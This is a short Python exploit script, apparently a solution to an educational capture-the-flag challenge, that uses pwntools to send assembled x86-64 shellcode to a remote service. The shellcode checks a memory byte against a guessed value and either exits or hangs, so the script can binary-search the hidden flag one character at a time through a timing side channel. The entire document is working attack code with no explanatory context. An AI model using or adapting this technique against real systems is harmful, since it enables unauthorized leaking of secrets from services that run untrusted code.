from pwn import *
context.arch = 'amd64'
offset = 0x2db7
index = 0
flag = b''
while True :
    upper_bound = 0x7f
    lower_bound = 0x1f
    while lower_bound+1 != upper_bound: 
        #r = process('./share/chal')
        r = remote('edu-ctf.zoolab.org','10002')
        guess = (lower_bound+upper_bound)//2
        #rint(hex(guess))
        payload = asm(f'''

        add r13, {offset}
        add r13, {index}
        mov rdi, r13
        mov bl, {guess}
        cmp bl, byte ptr [rdi]
        jge loop
        mov rax, 0x3c
        mov rdi, 1
        syscall
        loop : 
            nop
            jmp loop
        ''')
        #input()
        #r.sendlineafter(b'code\n\x00',payload)
        r.sendlineafter(b'code\n',payload)
        try :
            r.recv(timeout=0.5)
            upper_bound = guess

        except :
            lower_bound = guess
        r.close()
    flag += int.to_bytes(upper_bound,1,'little')
    print(flag)
    index+=1
    if upper_bound == 0x7d :
        break

r.interactive()
